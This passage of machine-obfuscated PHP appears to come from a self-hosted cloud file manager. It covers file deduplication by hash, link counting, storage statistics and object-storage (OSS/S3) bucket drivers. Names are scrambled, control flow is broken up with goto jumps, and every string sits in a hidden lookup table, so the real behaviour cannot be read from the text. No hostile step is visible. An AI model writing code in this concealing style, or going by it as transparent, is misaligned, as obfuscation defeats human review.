$bÎ±Ğô£‡ .= $c²ìÜÎ­ĞÎ[1364]; } break; case $c²ìÜÎ­ĞÎ[2189]: goto Bäšæ˜…•’; FÓé»¾¬±: if (IO::isTypeObject($bÎ±Ğô£‡) && !IO::isUploadServer($bÎ±Ğô£‡)) { IO::setContent($bÎ±Ğô£‡, $c²ìÜÎ­ĞÎ[33]); } CacheLock::unlock($Aè¶²àÜ²); break; goto F÷°¿Œæªí; BÎ‘†Ñßİô: CacheLock::lock($Aè¶²àÜ²); $Eô°®°Šùó = IO::fileNameAuto($CÚ¿æ‚ÕöÒ, $b”‰Š”µé£); $bÎ±Ğô£‡ = $CÚ¿æ‚ÕöÒ . $Eô°®°Šùó; goto FÓé»¾¬±; Bäšæ˜…•’: $D÷âêœ²² = Model($c²ìÜÎ­ĞÎ[1114])->get($c²ìÜÎ­ĞÎ[1360]); $Eä·¥¨¿¼ = substr(md5($c²ìÜÎ­ĞÎ[1947] . $D÷âêœ²² . date($c²ìÜÎ­ĞÎ[714])), 0, 8); $d¨èùÒÙ•š = KodIO::defaultDriver(); goto c™Öé·‡Ğß; c™Öé·‡Ğß: $CÚ¿æ‚ÕöÒ = $c²ìÜÎ­ĞÎ[2190] . $d¨èùÒÙ•š[$c²ìÜÎ­ĞÎ[392]] . $c²ìÜÎ­ĞÎ[2191] . date($c²ìÜÎ­ĞÎ[2192]) . $Eä·¥¨¿¼ . $c²ìÜÎ­ĞÎ[8]; if ($B‡©…Éé£—->ext($b”‰Š”µé£) == $c²ìÜÎ­ĞÎ[2128]) { $b”‰Š”µé£ .= $c²ìÜÎ­ĞÎ[1364]; } $Aè¶²àÜ² = $c²ìÜÎ­ĞÎ[2193] . $CÚ¿æ‚ÕöÒ . $b”‰Š”µé£; goto BÎ‘†Ñßİô; F÷°¿Œæªí: case $c²ìÜÎ­ĞÎ[2187]: break; default: break; } return $bÎ±Ğô£‡; goto D´¶Ğ¨í¢Ü; aöÎí†éï÷: $bÎ±Ğô£‡ = $CÚ¿æ‚ÕöÒ . rand_string(5) . short_id(100); $b”‰Š”µé£ = str_replace($c²ìÜÎ­ĞÎ[8], $c²ìÜÎ­ĞÎ[70], KodIO::clear($b”‰Š”µé£)); if (!$b”‰Š”µé£) { $c›â÷ Ñ¹§ = $c²ìÜÎ­ĞÎ[2187]; } goto A´ïŸ½”ÕŞ; aÙ«Ú Ûá¢: $c²ìÜÎ­ĞÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c›â÷ Ñ¹§ = Model($c²ìÜÎ­ĞÎ[1114])->get($c²ìÜÎ­ĞÎ[2185]); $CÚ¿æ‚ÕöÒ = KodIO::defaultIO() . date($c²ìÜÎ­ĞÎ[2186]); goto aöÎí†éï÷; D´¶Ğ¨í¢Ü: } public function addFileByRemote($aÀ‘½ŒŒ‰ß, $Dâ¾Ö¦Šë„, $AöÊ„Åå´Í = array()) { goto fæŠ¬ÌÉš; D•¦²ŞË: $C¼ËåÇØ‰È = IO::hashMd5($aÀ‘½ŒŒ‰ß, $c“İÒá³»§); $Fâ›†À‰… = KodIO::defaultDriver(); $Eñˆ¶â­Æ¢ = array($aãÛ®—ˆŸŞ[546] => IO::size($aÀ‘½ŒŒ‰ß), $aãÛ®—ˆŸŞ[2194] => 1, $aãÛ®—ˆŸŞ[411] => $Dâ¾Ö¦Šë„, $aãÛ®—ˆŸŞ[762] => $Fâ›†À‰…[$aãÛ®—ˆŸŞ[392]], $aãÛ®—ˆŸŞ[412] => $aÀ‘½ŒŒ‰ß, $aãÛ®—ˆŸŞ[2195] => $AöÊ„Åå´Í[$aãÛ®—ˆŸŞ[168]] ? $AöÊ„Åå´Í[$aãÛ®—ˆŸŞ[168]] : IO::hashSimple($aÀ‘½ŒŒ‰ß), $aãÛ®—ˆŸŞ[2196] => $C¼ËåÇØ‰È ? $C¼ËåÇØ‰È : $c“İÒá³»§); goto cÃÄ»£Ò„î; fæŠ¬ÌÉš: $aãÛ®—ˆŸŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!IO::exist($aÀ‘½ŒŒ‰ß)) { return !1; } $c“İÒá³»§ = $AöÊ„Åå´Í[$aãÛ®—ˆŸŞ[167]] ? $AöÊ„Åå´Í[$aãÛ®—ˆŸŞ[167]] : $aãÛ®—ˆŸŞ[33]; goto D•¦²ŞË; cÃÄ»£Ò„î: if ($a¯êÎ¨¾Ñí = $this->addFileCheckExist($Eñˆ¶â­Æ¢[$aãÛ®—ˆŸŞ[168]], $Eñˆ¶â­Æ¢[$aãÛ®—ˆŸŞ[167]], $Eñˆ¶â­Æ¢[$aãÛ®—ˆŸŞ[77]])) { return $a¯êÎ¨¾Ñí; } return $this->addFileData($Eñˆ¶â­Æ¢); goto E ­Šõ˜™à; E ­Šõ˜™à: } private function addFileData($aö…ï…óòÏ) { $dÌô¬Êí„ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$aö…ï…óòÏ) { return !1; } $aö…ï…óòÏ[$dÌô¬Êí„[77]] = intval($aö…ï…óòÏ[$dÌô¬Êí„[77]]); if (!$aö…ï…óòÏ[$dÌô¬Êí„[77]] && strlen($aö…ï…óòÏ[$dÌô¬Êí„[168]]) > 32) { $aö…ï…óòÏ[$dÌô¬Êí„[77]] = intval(substr($aö…ï…óòÏ[$dÌô¬Êí„[168]], 32)); } $cøÙŠè»ô† = $this->add($aö…ï…óòÏ); return $this->find($cøÙŠè»ô†); } public function addFile($dù¸Ò–‹êÛ, $c‡¿òé—Å‘, $aÀ¼Û×§ñÚ = false) { goto eöÄİÇ¾ø; eöÄİÇ¾ø: $fºóß á„‡ = IO::hashSimple($dù¸Ò–‹êÛ); $b¥Ş¤‚¯‘ = IO::hashMd5($dù¸Ò–‹êÛ); $CßÅ÷Òßí = IO::size($dù¸Ò–‹êÛ); goto Dè—ğŒ¯æ¥; Dè—ğŒ¯æ¥: $D½¿Ô¶“ğâ = $_SERVER[åÌÛ»ô¢‚ö™][2197] . $b¥Ş¤‚¯‘; CacheLock::lock($D½¿Ô¶“ğâ); if ($B¢•æ˜ÓÕ§ = $this->addFileCheckExist($fºóß á„‡, $b¥Ş¤‚¯‘, $CßÅ÷Òßí)) { CacheLock::unlock($D½¿Ô¶“ğâ); return $B¢•æ˜ÓÕ§; } goto f„ÕØ¸Ş; f„ÕØ¸Ş: $Aˆ”›¼¥³Ü = $this->addFileMake($dù¸Ò–‹êÛ, $CßÅ÷Òßí, $fºóß á„‡, $b¥Ş¤‚¯‘, $c‡¿òé—Å‘, $aÀ¼Û×§ñÚ); $D²è¬Ç¾™Ô = $this->addFileData($Aˆ”›¼¥³Ü); CacheLock::unlock($D½¿Ô¶“ğâ); goto Cò”Â½Ô¦; Cò”Â½Ô¦: return $D²è¬Ç¾™Ô; goto DÆì—İÉÉ²; DÆì—İÉÉ²: } public function addFileMake($AâÈ”Åº†‹, $CÄ¥ÍïáÃ, $d°–§ñ…õ, $a¬‚ĞÜ³—, $B¨”Ñª—È, $AÙ”˜¤»Üî) { goto Cå®¨¹½›; EÁ¹ˆ…“: $c­ôÌË—â = KodIO::defaultDriver(); $cïÄš’°Ó = array($cØæùæºØ§[546] => $CÄ¥ÍïáÃ, $cØæùæºØ§[2194] => 1, $cØæùæºØ§[411] => $B¨”Ñª—È, $cØæùæºØ§[762] => $c­ôÌË—â[$cØæùæºØ§[392]], $cØæùæºØ§[412] => $dÌµÀÕ± , $cØæùæºØ§[2195] => $d°–§ñ…õ, $cØæùæºØ§[2196] => $a¬‚ĞÜ³—); return $cïÄš’°Ó; goto F‡ŸÌ¸ßÎ‹; BÃ†Ê§áÚÖ: $C‰Ô†Ù„Â¼ = get_path_this($dÌµÀÕ± ); if ($AÙ”˜¤»Üî) { $bÔÑ’Õ³ßÛ = IO::move($AâÈ”Åº†‹, $aÄ‰Ú˜ ˜½, !1, $C‰Ô†Ù„Â¼); } else { $bÔÑ’Õ³ßÛ = IO::copy($AâÈ”Åº†‹, $aÄ‰Ú˜ ˜½, !1, $C‰Ô†Ù„Â¼); } if (!$bÔÑ’Õ³ßÛ) { return !1; } goto EÁ¹ˆ…“; Cå®¨¹½›: $cØæùæºØ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÌµÀÕ±  = $this->createFileName($B¨”Ñª—È); $aÄ‰Ú˜ ˜½ = get_path_father($dÌµÀÕ± ); goto BÃ†Ê§áÚÖ; F‡ŸÌ¸ßÎ‹: } public function addFileCheckExist($e•¥ËÚäÏ , $b¬‹š–ˆÅ„, $DİÖ×¡ñ³’) { $a£ÊñŞ÷£™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a†ÂÖî¬“ = $this->findByHash($e•¥ËÚäÏ , $b¬‹š–ˆÅ„); if (!$a†ÂÖî¬“) { return !1; } $C¶„Ş­·èÀ = array($a£ÊñŞ÷£™[2194] => intval($a†ÂÖî¬“[$a£ÊñŞ÷£™[2198]]) + 1, $a£ÊñŞ÷£™[546] => $DİÖ×¡ñ³’); $this->where(array($a£ÊñŞ÷£™[445] => $a†ÂÖî¬“[$a£ÊñŞ÷£™[444]]))->save($C¶„Ş­·èÀ); return $a†ÂÖî¬“; } public function remove($FŒòãÌ±è¹) { $this->linkCountChange($FŒòãÌ±è¹, !1); $this->clearEmpty(); return !0; } public function linkAdd($Añ‘Ã« ) { $this->linkCountChange($Añ‘Ã« , !0); } public function linkCountChange($Eëšî¤³, $EŒÎ›·«ÈŠ) { goto bóŠ¦›–ÙÎ; B’ÚñÄÈğ: foreach ($E‹÷²’° as $B½¢ôä—£Å => $EÒì¦™Ş°×) { $Eïö‡¯Ñ°˜ = $EÒì¦™Ş°× . $cÇ¨‘ÍÆÏ[33]; if (!$eàã˜½®îö[$Eïö‡¯Ñ°˜]) { $eàã˜½®îö[$Eïö‡¯Ñ°˜] = array(); } $eàã˜½®îö[$Eïö‡¯Ñ°˜][] = $B½¢ôä—£Å; } foreach ($eàã˜½®îö as $EÒì¦™Ş°× => $eêƒÃ¯Ï‚) { if (!$eêƒÃ¯Ï‚) { continue; } $EÒì¦™Ş°× = $EŒÎ›·«ÈŠ ? $EÒì¦™Ş°× : -intval($EÒì¦™Ş°×); $D…¨¬÷ª‰ò = array($cÇ¨‘ÍÆÏ[444] => array($cÇ¨‘ÍÆÏ[7], $eêƒÃ¯Ï‚)); if ($EÒì¦™Ş°× < 0) { $D…¨¬÷ª‰ò[$cÇ¨‘ÍÆÏ[2198]] = array($cÇ¨‘ÍÆÏ[950], abs($EÒì¦™Ş°×)); } $this->where($D…¨¬÷ª‰ò)->setAdd($cÇ¨‘ÍÆÏ[2198], $EÒì¦™Ş°×); } goto fƒ‹Ò•®²å; bóŠ¦›–ÙÎ: $cÇ¨‘ÍÆÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$Eëšî¤³) { return; } if (!is_array($Eëšî¤³)) { $Eëšî¤³ = array($Eëšî¤³); } goto B„ñ­¼Èò; B„ñ­¼Èò: $E‹÷²’° = array(); foreach ($Eëšî¤³ as $B½¢ôä—£Å) { $Eïö‡¯Ñ°˜ = $B½¢ôä—£Å . $cÇ¨‘ÍÆÏ[33]; if (!$E‹÷²’°[$Eïö‡¯Ñ°˜]) { $E‹÷²’°[$Eïö‡¯Ñ°˜] = 0; } $E‹÷²’°[$Eïö‡¯Ñ°˜]++; } $eàã˜½®îö = array(); goto B’ÚñÄÈğ; fƒ‹Ò•®²å: } public function findByHash($bÆáŸ¼ê, $D¶­Ü³ÁÎÂ = false) { $A·‚­±…Àœ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$bÆáŸ¼ê && !$D¶­Ü³ÁÎÂ) { return !1; } $aÃğÓŒãêÆ = array($A·‚­±…Àœ[2195] => $bÆáŸ¼ê); if ($D¶­Ü³ÁÎÂ) { $aÃğÓŒãêÆ = array($A·‚­±…Àœ[2196] => $D¶­Ü³ÁÎÂ); } return $this->order($A·‚­±…Àœ[2199])->where($aÃğÓŒãêÆ)->find(); } public function clearEmpty($Eä¼ ”‘¬Ú = 0) { goto eÇÂ„Úæ¥ˆ; CùĞ±ÛñĞ¦: foreach ($F—àÒ¶ëª† as $f´‹Õöà´) { $c­ï„Şâ–Ã->update(1); $this->resetFile($f´‹Õöà´); } $c­ï„Şâ–Ã->end(); goto CÚáŸ²–Ï; eÇÂ„Úæ¥ˆ: $D½¬àœŠ÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¨¼õ‚Íº = time() - 3600 * 24 * $Eä¼ ”‘¬Ú; $DÖ”ŸÀÛª = $D½¬àœŠ÷[2200] . $b¨¼õ‚Íº; goto DÉ¶‰õÄ„; DÉ¶‰õÄ„: $F—àÒ¶ëª† = $this->where($DÖ”ŸÀÛª)->select(); if (!$F—àÒ¶ëª†) { return; } $c­ï„Şâ–Ã = new Task($D½¬àœŠ÷[2201], $D½¬àœŠ÷[33], count($F—àÒ¶ëª†)); goto CùĞ±ÛñĞ¦; CÚáŸ²–Ï: } public function resetFile($Fµ·…Ù) { goto a‹‡ÀÖÖ­; a‹‡ÀÖÖ­: $Dëà¡Ì‚’° =& $_SERVER[åÌÛ»ô¢‚ö™]; $C‡ÎÛÍáˆ± = array($Dëà¡Ì‚’°[445] => $Fµ·…Ù[$Dëà¡Ì‚’°[444]]); $B£çéÍ©ªÈ = Model($Dëà¡Ì‚’°[1143])->where($C‡ÎÛÍáˆ±)->count(); goto fÍÃÍ¿ó…; fÍÃÍ¿ó…: $cˆôÙ¯ƒàŸ = Model($Dëà¡Ì‚’°[2202])->where($C‡ÎÛÍáˆ±)->count(); $C†ëÕì‰’¢ = intval($B£çéÍ©ªÈ) + intval($cˆôÙ¯ƒàŸ); if ($C†ëÕì‰’¢ == 0) { IO::remove($Fµ·…Ù[$Dëà¡Ì‚’°[75]]); $this->where($C‡ÎÛÍáˆ±)->delete(); $this->metaSet($Fµ·…Ù[$Dëà¡Ì‚’°[444]], null, null); return; } goto c±©¸·»Ü; c±©¸·»Ü: if ($Fµ·…Ù[$Dëà¡Ì‚’°[2198]] != $C†ëÕì‰’¢) { $this->where($C‡ÎÛÍáˆ±)->save(array($Dëà¡Ì‚’°[2194] => $C†ëÕì‰’¢)); } goto B³Âó¶ªØ¼; B³Âó¶ªØ¼: } public function storageInfo($d‘ìËñØ¿© = false) { goto CˆîáÖÌ”; CˆîáÖÌ”: $F›ÉÍá©ø =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fî½‚Äª = $this->count() + 0.0; $fç¯‹¤ñƒì = 0; goto AŒóˆ‹·†; bçÔùŞ©Óà: for ($dµ¶˜¶¯š = 0; $dµ¶˜¶¯š < $Fî½‚Äª; $dµ¶˜¶¯š = $dµ¶˜¶¯š + $B°— ‚¨‡è) { $B÷™»ÊêÀ® = $this->limit($dµ¶˜¶¯š, $dµ¶˜¶¯š + $B°— ‚¨‡è)->select(); foreach ($B÷™»ÊêÀ® as $bºÅÆğÒ—ˆ) { $FÛå¨áµî += $bºÅÆğÒ—ˆ[$F›ÉÍá©ø[77]] * $bºÅÆğÒ—ˆ[$F›ÉÍá©ø[2198]]; $fç¯‹¤ñƒì += $bºÅÆğÒ—ˆ[$F›ÉÍá©ø[77]] * ($bºÅÆğÒ—ˆ[$F›ÉÍá©ø[2198]] - 1); $e˜ŠĞõÑ¨– += $bºÅÆğÒ—ˆ[$F›ÉÍá©ø[2198]]; } } $C´ËŠ¯ŠÔÃ = array($F›ÉÍá©ø[2203] => $FÛå¨áµî, $F›ÉÍá©ø[2204] => $fç¯‹¤ñƒì, $F›ÉÍá©ø[2205] => $fç¯‹¤ñƒì / $FÛå¨áµî, $F›ÉÍá©ø[81] => $Fî½‚Äª, $F›ÉÍá©ø[2206] => $e˜ŠĞõÑ¨–); return $C´ËŠ¯ŠÔÃ; goto aˆ¸éõÏ¶‘; AŒóˆ‹·†: $FÛå¨áµî = 1; $e˜ŠĞõÑ¨– = 0; $B°— ‚¨‡è = 5000; goto bçÔùŞ©Óà; aˆ¸éõÏ¶‘: } } goto a‰‡ì›Ã; D¦¹¼ŒæèŒ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($cõÒóÔÆ) { parent::__construct($cõÒóÔÆ); $this->signatureVersion($_SERVER[åÌÛ»ô¢‚ö™][218]); } public function fileOutLink($b’“‰´••¹) { $e…åÅòÛ©‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (substr($b’“‰´••¹, 0, 7) == $e…åÅòÛ©‡[1141]) { $b’“‰´••¹ = $e…åÅòÛ©‡[1142] . substr($b’“‰´••¹, 7); } header($e…åÅòÛ©‡[156] . $b’“‰´••¹); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($bİ®ÎÊ­Ã) { parent::__construct(); include_once SDK_DIR . $_SERVER[åÌÛ»ô¢‚ö™][1196]; $this->_init($bİ®ÎÊ­Ã); } public function _init($c“²½ÔÒìŒ) { $D™˜“ÒŞÓ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($c“²½ÔÒìŒ as $dˆÁ©ÈÃÆ => $E§”á¥íÀ©) { if (isset($this->{$dˆÁ©ÈÃÆ})) { $this->{$dˆÁ©ÈÃÆ} = $E§”á¥íÀ©; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D™˜“ÒŞÓ§[1197] . LNG($D™˜“ÒŞÓ§[1198])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto b™ò›ƒÊ‹; eÉ‡…Œ¶ŞÜ: $FÀƒÅµŒ¹´->addAllowedOrigin($bóŸ¯‰Ù¬[1199]); $FÀƒÅµŒ¹´->addAllowedMethod($bóŸ¯‰Ù¬[1200]); $FÀƒÅµŒ¹´->addAllowedMethod($bóŸ¯‰Ù¬[1201]); goto f¶ä›İğ•; f¶ä›İğ•: $FÀƒÅµŒ¹´->addAllowedMethod($bóŸ¯‰Ù¬[1202]); $FÀƒÅµŒ¹´->addAllowedMethod($bóŸ¯‰Ù¬[1203]); $FÀƒÅµŒ¹´->addAllowedMethod($bóŸ¯‰Ù¬[155]); goto D²˜Ù×â›; eÌÜ¬¥›Î§: $f«¼Òàğµ³->addRule($FÀƒÅµŒ¹´); try { $this->client->putBucketCors($this->bucket, $f«¼Òàğµ³); } catch (OSS\Core\OssException $d…ˆ¨ÍÔ«Ì) { return !1; } return !0; goto dÇæ‘¹é£; D²˜Ù×â›: $FÀƒÅµŒ¹´->setMaxAgeSeconds(600); $FÀƒÅµŒ¹´->addExposeHeader($bóŸ¯‰Ù¬[1204]); $FÀƒÅµŒ¹´->addAllowedHeader($bóŸ¯‰Ù¬[1199]); goto eÌÜ¬¥›Î§; b™ò›ƒÊ‹: $bóŸ¯‰Ù¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f«¼Òàğµ³ = new OSS\Model\CorsConfig(); $FÀƒÅµŒ¹´ = new OSS\Model\CorsRule(); goto eÉ‡…Œ¶ŞÜ; dÇæ‘¹é£: } public function getBucketCors() { goto F¸¸š¹¤¡Ø; F¸¸š¹¤¡Ø: $E¥×¥ÑË”¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÙƒÒÖ¢… = null; try { $FÙƒÒÖ¢… = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A’–êøƒ³Š) { return null; } goto D”ó«˜ˆÅ; D”ó«˜ˆÅ: if (!$FÙƒÒÖ¢… || !($bêÉ±çàÆ¹ = $FÙƒÒÖ¢…->getRules())) { return null; } $dŒæÍ¤½Á = $bêÉ±çàÆ¹[0]->getAllowedOrigins(); $bñÀ¿ÜË Ô = $bêÉ±çàÆ¹[0]->getAllowedMethods(); goto e¢¨Îåæº; e¢¨Îåæº: $b¦ÚÜ‘»ä = $bêÉ±çàÆ¹[0]->getMaxAgeSeconds(); $c×™šĞ‹¦¿ = $bêÉ±çàÆ¹[0]->getExposeHeaders(); $D©ê‡¡° = $bêÉ±çàÆ¹[0]->getAllowedHeaders(); goto FÏƒê¢—ôŒ; FÏƒê¢—ôŒ: return array($E¥×¥ÑË”¥[189] => isset($dŒæÍ¤½Á[0]) ? $dŒæÍ¤½Á[0] : $E¥×¥ÑË”¥[33], $E¥×¥ÑË”¥[193] => $bñÀ¿ÜË Ô, $E¥×¥ÑË”¥[1205] => $b¦ÚÜ‘»ä, $E¥×¥ÑË”¥[1206] => isset($c×™šĞ‹¦¿[0]) ? $c×™šĞ‹¦¿[0] : $E¥×¥ÑË”¥[33], $E¥×¥ÑË”¥[191] => isset($D©ê‡¡°[0]) ? $D©ê‡¡°[0] : $E¥×¥ÑË”¥[33]); goto Eâƒï”½è¨; Eâƒï”½è¨: } public function isBucketCors() { goto AÕ×Éé¯Ûã; AÕ×Éé¯Ûã: $f…àÓ¿ÀŒŸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f›Ô‰ŸàÅå = $this->getBucketCors(); if (!$f›Ô‰ŸàÅå || !is_array($f›Ô‰ŸàÅå)) { return !1; } goto CÚ°Åñáè; f‚ç®×ïàĞ: $E‚ŸÉØ¨± = array($f…àÓ¿ÀŒŸ[194], $f…àÓ¿ÀŒŸ[195], $f…àÓ¿ÀŒŸ[196], $f…àÓ¿ÀŒŸ[197], $f…àÓ¿ÀŒŸ[198]); $b‚ÑØ®Áê = array_diff($E‚ŸÉØ¨±, $FŒ¨†ÇË‰); return empty($b‚ÑØ®Áê); goto CëàæÇ; CÚ°Åñáè: if ($f›Ô‰ŸàÅå[$f…àÓ¿ÀŒŸ[189]] != $f…àÓ¿ÀŒŸ[190] || $f›Ô‰ŸàÅå[$f…àÓ¿ÀŒŸ[191]] != $f…àÓ¿ÀŒŸ[190]) { return !1; } $FŒ¨†ÇË‰ = array_map($f…àÓ¿ÀŒŸ[192], $f›Ô‰ŸàÅå[$f…àÓ¿ÀŒŸ[193]]); if (!is_array($FŒ¨†ÇË‰)) { $FŒ¨†ÇË‰ = array(); } goto f‚ç®×ïàĞ; CëàæÇ: } public function mkfile($C²´ÀÆ®Ş–, $FÔÈ—°·œí = '', $e“†ÁêĞº = REPEAT_RENAME) { $Eš…¡ ¨ = $this->setContent($C²´ÀÆ®Ş–, $FÔÈ—°·œí); if ($Eš…¡ ¨ !== !1) { return $this->getPathOuter($C²´ÀÆ®Ş–); } return !1; } public function mkdir($E“–ñ¦à‚Ñ, $bÓ­Ö”èó‡ = REPEAT_SKIP) { if ($this->_isFolder($E“–ñ¦à‚Ñ)) { return $this->getPathOuter($E“–ñ¦à‚Ñ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($E“–ñ¦à‚Ñ)); } catch (OSS\Core\OssException $dˆ¤›Ã‚œÉ) { return !1; } return $this->getPathOuter($E“–ñ¦à‚Ñ); } private function fileList($b¾„ó¹µš, $cäôá±ÛĞ° = '', $AÆÓøİ„á = 0) { goto C‡¦µãÍİ; Cï† ƒÔº: return array($EÚÓŸ‹×©„[74] => $b­¦ä¤©‹˜, $EÚÓŸ‹×©„[73] => $d¹Õ§ğøì†); goto bó¹‰İå; e†£ïËª±°: $b­¦ä¤©‹˜ = $d¹Õ§ğøì† = array(); while (!0) { check_abort(); $Fµ°±Äİè = array($EÚÓŸ‹×©„[1207] => $cäôá±ÛĞ°, $EÚÓŸ‹×©„[1208] => $d‚Ôî«¾ î, $EÚÓŸ‹×©„[1209] => $a‰‘†”»Í, $EÚÓŸ‹×©„[1210] => $c¹İÉ®£Š); try { $AÈÜÒ÷ø« = $this->client->listObjects($this->bucket, $Fµ°±Äİè); } catch (OSS\Core\OssException $CÓŠ¼â‡·ƒ) { break; } $c¹İÉ®£Š = $AÈÜÒ÷ø«->getNextMarker(); $F™øç•˜Ë· = $AÈÜÒ÷ø«->getObjectList(); $A‚Å‹Âİé‘ = $AÈÜÒ÷ø«->getPrefixList(); foreach ($F™øç•˜Ë· as $Cƒ·§¹·‘™) { goto dÄ¸ñ«‘æª; dÄ¸ñ«‘æª: if ($Cƒ·§¹·‘™->getKey() == $d‚Ôî«¾ î) { continue; } $bÜ¤³×é™ = $Cƒ·§¹·‘™->getKey(); $cÌ†ØÄÕ‚¬ = $Cƒ·§¹·‘™->getSize(); goto cğÄ«ì; bÖ§ÉËÄ•: if ($bÁ”÷‚Â·) { $this->cacheMethod($EÚÓŸ‹×©„[205], $bÜ¤³×é™, $eéÑ“Íõ); $this->cacheMethod($EÚÓŸ‹×©„[206], $bÜ¤³×é™, array($EÚÓŸ‹×©„[77] => $cÌ†ØÄÕ‚¬, $EÚÓŸ‹×©„[1211] => $cÌ†ØÄÕ‚¬, $EÚÓŸ‹×©„[107] => strtotime($bÀÃ÷ë—Šó), $EÚÓŸ‹×©„[1212] => $bÀÃ÷ë—Šó)); } if ($eéÑ“Íõ) { $b­¦ä¤©‹˜[] = $bÜ¤³×é™; continue; } $d¹Õ§ğøì†[] = $AØ†ˆå—‡ë; goto aÎÈæ­‘Ï«; cğÄ«ì: $bÀÃ÷ë—Šó = $Cƒ·§¹·‘™->getLastModified(); $AØ†ˆå—‡ë = $AÆÓøİ„á ? array($EÚÓŸ‹×©„[28] => $bÜ¤³×é™, $EÚÓŸ‹×©„[77] => $cÌ†ØÄÕ‚¬, $EÚÓŸ‹×©„[203] => strtotime($bÀÃ÷ë—Šó)) : $bÜ¤³×é™; $eéÑ“Íõ = $cÌ†ØÄÕ‚¬ == 0 && substr($bÜ¤³×é™, strlen($bÜ¤³×é™) - 1, 1) == $EÚÓŸ‹×©„[8] ? !0 : !1; goto bÖ§ÉËÄ•; aÎÈæ­‘Ï«: } foreach ($A‚Å‹Âİé‘ as $FÕì©¿‰“) { $b­¦ä¤©‹˜[] = $FÕì©¿‰“->getPrefix(); if ($bÁ”÷‚Â·) { $this->cacheMethod($EÚÓŸ‹×©„[205], $bÜ¤³×é™, !0); } } if ($c¹İÉ®£Š === $EÚÓŸ‹×©„[33]) { break; } } if ($bÁ”÷‚Â·) { $this->cacheMethod($EÚÓŸ‹×©„[205], $b¾„ó¹µš, !0); } goto Cï† ƒÔº; f—İª±÷Œ: $c¹İÉ®£Š = $EÚÓŸ‹×©„[33]; $a‰‘†”»Í = 1000; $bÁ”÷‚Â· = $this->listItemCache === !1 ? !1 : !0; goto e†£ïËª±°; C‡¦µãÍİ: $EÚÓŸ‹×©„ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¾„ó¹µš = trim($b¾„ó¹µš, $EÚÓŸ‹×©„[8]); $d‚Ôî«¾ î = empty($b¾„ó¹µš) ? $EÚÓŸ‹×©„[33] : $b¾„ó¹µš . $EÚÓŸ‹×©„[8]; goto f—İª±÷Œ; bó¹‰İå: } public function copyFile($aÖÌÑ‚š–Î, $bøÕÏƒ¦Î¨) { $c•”ë¡å«ô = $this->size($aÖÌÑ‚š–Î); if ($c•”ë¡å«ô < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $aÖÌÑ‚š–Î, $this->bucket, $this->pathEncode($bøÕÏƒ¦Î¨)); } catch (OSS\Core\OssException $C·®ÉÂ«ù‰) { return !1; } return $this->getPathOuter($bøÕÏƒ¦Î¨); } $DÛ±Ò†ÅÆç = $this->multiCopyObject($aÖÌÑ‚š–Î, $bøÕÏƒ¦Î¨, $c•”ë¡å«ô); return $DÛ±Ò†ÅÆç ? $this->getPathOuter($bøÕÏƒ¦Î¨) : !1; } private function multiCopyObject($D²¸Ùâ†óä, $f‰ÙÏ‹µä², $côÜ‡°éÈò) { $fèÄ‘Æ‚»™ =& $_SERVER[åÌÛ»ô¢‚ö™]; try { goto aïÎç×—§; aïÎç×—§: $AÙâÂ±Ã’í = array(); if ($b¢š£°Ì÷ª = $this->hashMd5($D²¸Ùâ†óä)) { $AÙâÂ±Ã’í = array(OSS\OssClient::OSS_HEADERS => array($fèÄ‘Æ‚»™[1213] => $b¢š£°Ì÷ª)); } $Bª¯´Óµ²é = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f‰ÙÏ‹µä²), $AÙâÂ±Ã’í); goto bæ‡ƒ•ù; bæ‡ƒ•ù: $b‹¬ñÌìä = 1; $dçê‰ÖĞ– = 0; $D“¸”µ·æË = array(); goto BÉÊ™Ü¼õ‚; BŞºÑºŸ: $Få±ˆ…Õ‰ô = array(); foreach ($D“¸”µ·æË as $F›Ã¸–É => $eê»ÎŒ²Ô) { $Få±ˆ…Õ‰ô[] = array($fèÄ‘Æ‚»™[1217] => $F›Ã¸–É + 1, $fèÄ‘Æ‚»™[1218] => $eê»ÎŒ²Ô); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($f‰ÙÏ‹µä²), $Bª¯´Óµ²é, $Få±ˆ…Õ‰ô); goto bï„îöÆÆ; BÉÊ™Ü¼õ‚: $BåŒ‘ÍŒÙô = 1024 * 1024 * 10; $AáÚùÖá = $this->client->generateMultiuploadParts($côÜ‡°éÈò, $BåŒ‘ÍŒÙô); foreach ($AáÚùÖá as $F›Ã¸–É => $CÕÖáÏëÂ) { $A¶†³İ¡¥¿ = $dçê‰ÖĞ– + (int) $CÕÖáÏëÂ[$fèÄ‘Æ‚»™[1214]]; $f×ğõÔà¥ = (int) $CÕÖáÏëÂ[$fèÄ‘Æ‚»™[340]] + $A¶†³İ¡¥¿ - 1; $B“ö½ªÄ› = array($fèÄ‘Æ‚»™[1215] => $A¶†³İ¡¥¿, $fèÄ‘Æ‚»™[1216] => $f×ğõÔà¥); $D“¸”µ·æË[] = $this->client->uploadPartCopy($this->bucket, $D²¸Ùâ†óä, $this->bucket, 